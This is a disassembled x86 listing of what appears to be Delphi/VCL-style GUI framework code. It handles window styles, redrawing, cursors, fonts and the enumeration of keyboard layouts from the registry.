test esi 0x80000
jne r-xdata
cmp [ ebx + 0x350 ] 0x0
je r-xdata
movzx eax [ ebx + 0x328 ]
mov eax [ eax * 4 + rw-data ]
movzx edx [ ebx + 0x350 ]
or eax [ edx * 4 + rw-data ]
push eax
movzx eax [ ebx + 0x329 ]
push eax
mov eax [ ebx + 0x354 ]
push eax
mov eax ebx
call sub_3ab7c38
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call RedrawWindow
sub_3acc098
push ebx
mov ebx eax
cmp dl [ ebx + 0x350 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x350 ] dl
cmp [ ebx + 0x350 ] 0x0
je r-xdata
mov eax ebx
call sub_3acbf84
mov eax ebx
call sub_3ad0d70
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax ebx
call sub_3ad0d70
xor edx edx
call sub_3ad1184
sub_3acc104
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_3aaf210
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff
shl edx 0x10
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x278 ] 0x3
je r-xdata
xor edx edx
call sub_3ac852c
retn
sub_3acc140
test [ eax + 0x1c ] 0x10
je r-xdata
call sub_3aaf244
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov ecx [ eax + 0x18 ]
and ecx 0xffff0000
and edx 0xffff
or ecx edx
mov [ eax + 0x18 ] ecx
test [ eax + 0x1c ] 0x1
jne r-xdata
retn
cmp [ eax + 0x278 ] 0x3
je r-xdata
xor edx edx
call sub_3ac852c
retn
sub_3acc180
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xf0 ]
xor edx edx
mov eax ebx
call sub_3ac54ec
mov dl 0x5
mov eax ebx
call sub_3ac7c04
mov dl 0x1
mov eax ebx
call sub_3ab6760
mov dl 0x3
mov eax ebx
call sub_3ac8024
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3acc1e8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov esi eax
xor eax eax
push ebp
push sub_3acc2c8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_3ab65ec
dec eax
jne r-xdata
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_3ab6450
mov dl 0x5
mov eax [ ebp - 0x8 ]
call sub_3aaef04
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_3aafaf8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_3a65390
mov ebx [ ebp - 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acc2cf
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov dl 0x1
mov eax esi
call sub_3ac6dc0
mov eax [ ebp - 0x4 ]
call sub_3a65730
mov edx eax
mov ecx ebx
mov eax [ ebp - 0x8 ]
call sub_3aafb08
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3aafbb8
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_3a659c0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_3acc2f8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_3ab3ba4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_3ac61b8
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_3ab3b68
mov edx ebx
pop ecx
mov si 0xffcc
call sub_3a6457c
inc ebp
dec edi
jne r-xdata
sub_3acc344
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_3ab65ec
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_3acc370
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_3aca170
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_3acc398
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_3aca188
cmp [ ebx + 0x8f ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_3ab7c38
call sub_3ac4004
test eax eax
jne r-xdata
mov eax ebx
call sub_3ab65ec
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_3ab7c38
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_3ab7c38
push eax
call PostMessageA
cmp [ ebx + 0x276 ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_3ab6600
or ecx 0xffffffff
mov dl 0x1
call sub_3ab02fc
pop esi
pop ebx
retn
sub_3acc42c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_3ab7320
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_3ab0e78
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0x94 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_3aaf4a0
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_3a6457c
sub_3acc484
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_3acc559
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_3aafaf8
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_3a65390
mov edi [ ebp - 0x4 ]
test edi edi
je r-xdata
sub eax 0xafff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_3a65730
mov edx eax
mov eax [ ebx + 0x4 ]
mov ecx edi
call sub_3aafb08
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acc560
lea eax [ ebp - 0x4 ]
call sub_3a652a0
retn
mov eax [ ebx + 0x4 ]
movzx edx [ eax + 0x57 ]
mov eax esi
call sub_3ac6dc0
jmp r-xdata
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_3aafbb8
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_3a659c0
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx edx [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_3acc580
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_3ab709c
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_3ab65ec
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_3ab6600
movzx edx [ ebx + 0x57 ]
call sub_3aafaa8
inc edi
dec esi
jne r-xdata
sub_3acc628
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_3acc658
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_3acc6ac
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_3a83664
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_3acca50
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_3acca5c
mov eax ebx
call sub_3acca68
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_3ac7f10
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8904c
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8904c
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a8904c
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_3accee0
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_3accdb0
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_3accdb0
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_3accdb0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_3a646e4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_3a6473c
pop [ fs : 0x0 ]
add esp 0xc
sub_3acc804
push ebx
push esi
push edi
push ebp
call sub_3a6478c
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_3a64380
mov eax [ ebp + 0x88 ]
call sub_3a64380
mov eax [ ebp + 0x84 ]
call sub_3a64380
mov eax [ ebp + 0x54 ]
call sub_3a64380
mov eax [ ebp + 0x50 ]
call sub_3a64380
mov eax [ ebp + 0x4c ]
call sub_3a64380
mov eax [ ebp + 0x30 ]
call sub_3a64380
mov eax [ ebp + 0x34 ]
call sub_3a64380
mov eax [ ebp + 0x7c ]
call sub_3a64380
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_3a64380
mov eax ebp
call sub_3accac4
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_3a836b0
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_3a64734
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_3a7a494
call sub_3a64380
inc edi
dec esi
jne r-xdata
sub_3acc97c
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_3acc9c8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_3a7a33c
mov eax esi
mov edx [ r-xdata ]
call sub_3a6450c
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_3a7a33c
mov eax [ rw-data ]
call sub_3ad00f8
sub_3acca00
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_3a7a630
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_3a7a630
mov eax [ rw-data ]
call sub_3ad00f8
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_3ab9600
sub_3acca68
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_3accb6c
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_3accac4
push ebx
push esi
push edi
push ebp
mov ebp eax
mov ebx [ ebp + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ ebp + 0x60 ]
cmp eax edx
je r-xdata
mov esi [ ebx + 0x4 ]
cmp esi 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp esi 0xffffffeb
je r-xdata
cmp esi 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test esi esi
jle r-xdata
mov edi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_3a62efc
mov ebx edi
test ebx ebx
jne r-xdata
sub_3accb24
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_3acc928
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_3acc914
mov [ esp ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_3acc914
cmp ebp [ eax + 0x4 ]
jne r-xdata
sub_3accb6c
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_3a62ee0
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_3accb94
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_3accd3f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3accd46
lea eax [ ebp - 0x260 ]
call sub_3a652a0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_3a64350
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_3a652a0
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x25 ] 0x0
mov dl 0x1
call sub_3a7ca78
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_3a6a7d0
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_3abd3ec
test al al
je r-xdata
xor eax eax
push ebp
push sub_3acccfb
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_3a65510
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_3a65510
sub_3accdb0
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_3acff30
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_3acfc94
mov dl 0x1
mov eax [ rw-data ]
call sub_3acfc94
sub_3acce1c
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_3acce44
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_3acce1c
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
movzx eax [ esp ]
mov [ esp + 0x8 ] ax
movzx eax [ esp + 0x4 ]
mov [ esp + 0xa ] ax
mov eax [ esp + 0x8 ]
push eax
push 0x0
push 0x84
push edi
call __imp_SendMessageA
movzx eax ax
or eax 0x2000000
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
sub_3accee0
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_3acd027
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
movzx eax [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_3acfc94
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_3a8949c
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_3a8949c
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_3a89588
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_3a8949c
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_3a8949c
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_3a8949c
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
movzx edx [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_3acfc94
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_3a89220
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_3a89220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_3acd02e
cmp [ rw-data ] 0x0
je r-xdata
sub_3acd064
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
dec cl
je r-xdata
mov eax esi
call sub_3ac6970
mov ebx eax
mov eax edi
call sub_3ac6970
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_3ac6970
mov ebx eax
add ebx [ edi + 0x4c ]
mov eax esi
call sub_3ac6970
add eax [ esi + 0x4c ]
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax esi
call sub_3ac6950
mov ebx eax
mov eax edi
call sub_3ac6950
cmp ebx eax
setl al
jmp r-xdata
dec cl
je r-xdata
mov eax edi
call sub_3ac6950
mov ebx eax
add ebx [ edi + 0x48 ]
mov eax esi
call sub_3ac6950
add eax [ esi + 0x48 ]
cmp ebx eax
setl al
jmp r-xdata
sub_3acd0ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
movzx eax [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x273 ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax ebx
call sub_3ac6950
mov [ ebp - 0x8 ] eax
mov eax ebx
call sub_3ac6970
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x88 ]
cmp [ ebx + 0x273 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
movzx eax [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
movzx edx [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_3acd232 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_3acd2a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_3acc974
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
